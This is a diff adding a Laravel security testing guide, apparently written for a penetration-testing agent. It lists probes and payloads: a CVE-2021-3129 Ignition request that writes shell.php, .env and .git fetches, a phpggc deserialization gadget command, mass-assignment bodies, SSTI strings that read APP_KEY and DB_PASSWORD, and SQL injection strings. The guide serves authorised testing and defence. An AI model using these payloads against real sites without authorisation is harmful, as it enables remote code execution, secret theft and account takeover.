@@ -1,0 +1,517 @@
+<laravel_security_guide>
+<title>LARAVEL PHP FRAMEWORK SECURITY TESTING</title>
+
+<critical>Laravel is a popular PHP framework with specific security patterns. Vulnerabilities arise from debug mode exposure, encryption key leakage, mass assignment via fillable/guarded misconfigurations, route model binding bypass, Blade template injection, and Eloquent injection. Testing must cover Laravel-specific attack vectors.</critical>
+
+<scope>
+- Debug mode exploitation (APP_DEBUG)
+- Encryption key exposure (APP_KEY)
+- Mass assignment via fillable/guarded
+- Route model binding bypass
+- Blade template injection
+- Eloquent injection
+- Session and CSRF issues
+</scope>
+
+<methodology>
+1. Identify Laravel version and configuration.
+2. Check for debug mode and error exposure.
+3. Test mass assignment vulnerabilities.
+4. Probe route model binding for bypass.
+5. Test template injection in Blade views.
+6. Analyze Eloquent queries for injection.
+</methodology>
+
+<debug_mode>
+<debug_exploitation>
+{% raw %}
+# Debug mode detection and exploitation:
+
+# Check for debug mode:
+# Trigger an error and look for:
+# - Stack traces
+# - Environment variables
+# - Configuration values
+
+# Common debug endpoints:
+/_debugbar
+/_debugbar/open
+/_ignition/execute-solution
+
+# Trigger error:
+/api/test?id=invalid_type
+/api/test?id[]=array_not_expected
+
+# Debug bar information:
+# - Database queries with bindings
+# - Session data
+# - Request parameters
+# - Environment variables
+
+# Ignition error page exploitation:
+# Laravel 6.x - 8.x with Ignition
+# CVE-2021-3129: RCE via file_get_contents + file_put_contents
+POST /_ignition/execute-solution
+{
+  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+  "parameters": {
+    "variableName": "test",
+    "viewFile": "php://filter/write=convert.base64-decode/resource=shell.php"
+  }
+}
+{% endraw %}
+</debug_exploitation>
+
+<error_disclosure>
+{% raw %}
+# Error-based information disclosure:
+
+# Stack traces reveal:
+# - File paths
+# - Line numbers
+# - Class/method names
+# - Database connection details
+# - Environment info
+
+# Force errors:
+GET /api/users/not-a-number
+POST /api/create (with missing required field)
+GET /api/users?id=1' (SQL error)
+
+# Check response headers:
+X-Debug-Token
+X-Debug-Link
+X-Laravel-Version
+
+# Common exposed routes:
+/horizon (job monitoring)
+/telescope (debug dashboard)
+/nova (admin panel)
+{% endraw %}
+</error_disclosure>
+</debug_mode>
+
+<app_key_exposure>
+<key_discovery>
+{% raw %}
+# APP_KEY exposure vectors:
+
+# .env file exposure:
+GET /.env
+GET /laravel/.env
+GET /public/.env
+GET /storage/.env
+
+# Backup files:
+GET /.env.backup
+GET /.env.old
+GET /.env.save
+GET /.env.swp
+
+# Source code leakage:
+GET /.git/config
+GET /config/app.php
+
+# Error messages may reveal:
+# "The MAC is invalid" - encryption issue
+# Key format: base64:xxxxxxxxx...
+
+# Decryption attack:
+# If key known, decrypt:
+# - Session cookies
+# - Encrypted values
+# - Remember me tokens
+{% endraw %}
+</key_discovery>
+
+<key_exploitation>
+{% raw %}
+# APP_KEY exploitation:
+
+# 1. Session forgery:
+# Decrypt session cookie
+# Modify user_id or role
+# Re-encrypt with known key
+
+# 2. Deserialization RCE:
+# Laravel < 5.6.30
+# Craft malicious serialized payload
+# Encrypt with APP_KEY
+# Send as session cookie
+
+# PHP deserialization gadget:
+# Use phpggc to generate:
+phpggc Laravel/RCE1 system 'id' -b
+
+# Encrypt payload:
+php -r "
+\$key = 'base64:your_key_here';
+\$payload = 'serialized_payload';
+echo encrypt(\$payload);
+"
+
+# 3. Remember me token forgery:
+# Decrypt, modify user ID
+# Re-encrypt
+{% endraw %}
+</key_exploitation>
+</app_key_exposure>
+
+<mass_assignment>
+<mass_assignment_testing>
+{% raw %}
+# Mass assignment vulnerability testing:
+
+# Test hidden/guarded bypass:
+POST /api/users
+{
+  "name": "John",
+  "email": "john@test.com",
+  "is_admin": true,
+  "role": "admin"
+}
+
+# Common sensitive fields:
+is_admin, isAdmin
+role, role_id
+permissions
+verified, email_verified_at
+active, status
+balance, credits
+
+# Fillable bypass via relationships:
+POST /api/users
+{
+  "name": "John",
+  "profile": {
+    "admin_level": 10
+  }
+}
+
+# Update vs Create:
+# Sometimes update allows more fields
+PUT /api/users/1
+{
+  "role": "admin"
+}
+
+# Nested mass assignment:
+{
+  "user": {
+    "roles": [{"name": "admin"}]
+  }
+}
+{% endraw %}
+</mass_assignment_testing>
+
+<guarded_bypass>
+{% raw %}
+# Guarded bypass techniques:
+
+# 1. Empty guarded array:
+# If $guarded = []
+# All fields fillable!
+
+# 2. forceFill() usage:
+# Bypasses guarded/fillable
+# Check for API using forceFill
+
+# 3. Relationship mass assignment:
+# Nested relationships may not check guarded
+{
+  "posts": [{"admin_only": true}]
+}
+
+# 4. JSON columns:
+# If using JSON columns:
+{
+  "settings": {"is_admin": true}
+}
+
+# 5. Update via query builder:
+# Model::where()->update() bypasses guarded
+# Check if API uses this pattern
+{% endraw %}
+</guarded_bypass>
+</mass_assignment>
+
+<route_model_binding>
+<binding_bypass>
+{% raw %}
+# Route model binding bypass:
+
+# IDOR via binding:
+GET /users/1/posts
+GET /users/2/posts  # Another user's posts
+
+# Soft delete bypass:
+# By default, binding excludes soft deleted
+# Try: withTrashed() may be missing
+GET /users/deleted_user_id
+
+# Custom key bypass:
+# If using custom route key:
+GET /users/admin  # username instead of ID
+GET /users/../admin  # Path traversal
+
+# Scoped binding bypass:
+# /users/{user}/posts/{post}
+# Post may not be properly scoped to user
+GET /users/1/posts/999  # Post belongs to user 2
+
+# Type juggling:
+GET /users/1
+GET /users/1.0
+GET /users/1e0
+{% endraw %}
+</binding_bypass>
+
+<authorization_bypass>
+{% raw %}
+# Authorization policy bypass:
+
+# Missing policy:
+# Route may not have policy attached
+# Direct access without authorization
+
+# Policy method mismatch:
+# Wrong method called for action
+# view() instead of viewAny()
+
+# Before() bypass:
+# Admin check in before()
+# But regular checks still run
+
+# Guest access:
+# Check optional authentication
+GET /api/resource (no auth header)
+
+# Implicit binding authorization:
+# Model found but not authorized
+# Returns 200 instead of 403
+{% endraw %}
+</authorization_bypass>
+</route_model_binding>
+
+<blade_injection>
+<template_injection>
+{% raw %}
+# Blade template injection:
+
+# Test for unescaped output:
+# {!! $variable !!} is vulnerable
+# {{ $variable }} is escaped
+
+# Injection payloads:
+<script>alert(1)</script>
+{{7*7}}  # Blade syntax won't execute
+@php echo 'RCE'; @endphp  # If user controls template
+
+# If using dynamic views:
+view('pages.' . $userInput)
+# Try: ../../../config/app
+
+# Blade component injection:
+<x-dynamic-component :component="$userInput" />
+# Try: 'layouts.app' or other components
+
+# Raw directive abuse:
+@{{ $variable }}  # Escapes Blade but may execute JS
+{% endraw %}
+</template_injection>
+
+<ssti_testing>
+{% raw %}
+# SSTI in Blade:
+
+# Note: Blade is not as vulnerable as Twig/Jinja
+# But if user input goes to view compilation:
+
+# Template injection:
+{{ config('app.key') }}
+{{ env('DB_PASSWORD') }}
+{{ system('id') }}  # Won't work normally
+
+# File inclusion:
+@include($userInput)
+# Try: '../../.env'
+
+# Escape sequence testing:
+@verbatim {{ $var }} @endverbatim
+@{!! $var !!}
+{% endraw %}
+</ssti_testing>
+</blade_injection>
+
+<eloquent_injection>
+<query_injection>
+{% raw %}
+# Eloquent/Query Builder injection:
+
+# Raw expressions:
+User::whereRaw($userInput)->get();
+# Payload: "1=1) OR 1=1--"
+
+# orderBy injection:
+User::orderBy($userInput)->get();
+# Payload: "(SELECT password FROM users LIMIT 1)"
+
+# Column name injection:
+User::where($column, $value)->get();
+# If $column is user controlled:
+# Payload: "id) OR 1=1--"
+
+# JSON where clauses:
+User::whereJsonContains('options->'.$key, $value);
+# Key injection possible
+
+# Like injection:
+User::where('name', 'LIKE', "%$search%")->get();
+# Payload: "%' OR '1'='1"
+{% endraw %}
+</query_injection>
+
+<database_bypass>
+{% raw %}
+# Database query bypass:
+
+# Soft delete scope bypass:
+User::withTrashed()->find($id);
+# May expose deleted records
+
+# Global scope bypass:
+# If scopes are user-controlled:
+User::withoutGlobalScope('active');
+
+# Relationship loading:
+User::with('secrets')->find($id);
+# May eager load restricted relations
+
+# Select injection:
+User::select($columns)->get();
+# Payload: ["*", "(SELECT password FROM admins)"]
+
+# Having clause:
+User::having($column, $operator, $value);
+# All parameters may be injectable
+{% endraw %}
+</database_bypass>
+</eloquent_injection>
+
+<session_csrf>
+<session_attacks>
+{% raw %}
+# Session security testing:
+
+# Session fixation:
+# Check if session ID regenerates on login
+Set-Cookie: laravel_session=attacker_controlled
+
+# Session cookie settings:
+# Check for:
+# - Secure flag (HTTPS only)
+# - HttpOnly flag
+# - SameSite attribute
+
+# Remember me token:
+# Check for predictability
+# Test token reuse
+
+# Session driver exposure:
+# File driver: /storage/framework/sessions/
+# Check for directory listing
+{% endraw %}
+</session_attacks>
+
+<csrf_bypass>
+{% raw %}
+# CSRF bypass techniques:
+
+# 1. Missing CSRF on API:
+# API routes may not have CSRF
+POST /api/change-password
+
+# 2. GET method override:
+# Some endpoints accept GET
+GET /settings?_method=POST&password=new
+
+# 3. JSON content type:
+# May bypass CSRF
+POST /endpoint
+Content-Type: application/json
+{"data": "value"}
+
+# 4. Token in URL:
+# Check if token is in URL
+GET /form?_token=xxx
+# Referer leakage
+
+# 5. Subdomain issues:
+# CSRF cookies from subdomain
+{% endraw %}
+</csrf_bypass>
+</session_csrf>
+
+<common_payloads>
+{% raw %}
+# Debug mode:
+GET /_ignition/execute-solution
+
+# .env exposure:
+GET /.env
+
+# Mass assignment:
+{"is_admin": true, "role": "admin"}
+
+# IDOR:
+GET /users/2/posts
+
+# SQL injection:
+orderBy=id); SELECT * FROM users--
+
+# SSTI:
+{{ config('app.key') }}
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate debug mode information disclosure.
+2. Show APP_KEY exposure or exploitation.
+3. Prove mass assignment vulnerability.
+4. Document IDOR via route model binding.
+5. Provide Eloquent injection proof.
+</validation>
+
+<false_positives>
+- APP_DEBUG=false in production
+- APP_KEY properly secured
+- Properly configured guarded/fillable
+- Route model binding with authorization
+- Parameterized Eloquent queries
+- CSRF on all state-changing routes
+</false_positives>
+
+<impact>
+- Remote code execution via debug mode
+- Session hijacking via APP_KEY exposure
+- Privilege escalation via mass assignment
+- Data breach via IDOR
+- SQL injection via Eloquent
+- Account takeover via session issues
+</impact>
+
+<pro_tips>
+1. Always check for .env file exposure.
+2. Trigger errors to check debug mode.
+3. Test all fields for mass assignment.
+4. Check route model binding authorization.
+5. Look for raw Eloquent queries.
+6. Test CSRF on API endpoints.
+7. Check /horizon, /telescope, /nova access.
+8. Verify session cookie security flags.
+9. Test remember me token security.
+10. Document Laravel version for CVE research.
+</pro_tips>
+
+<remember>Laravel's security relies on proper configuration. Debug mode, exposed keys, and mass assignment are common issues. Always verify that security features are properly enabled and configured in production environments.</remember>
+</laravel_security_guide>
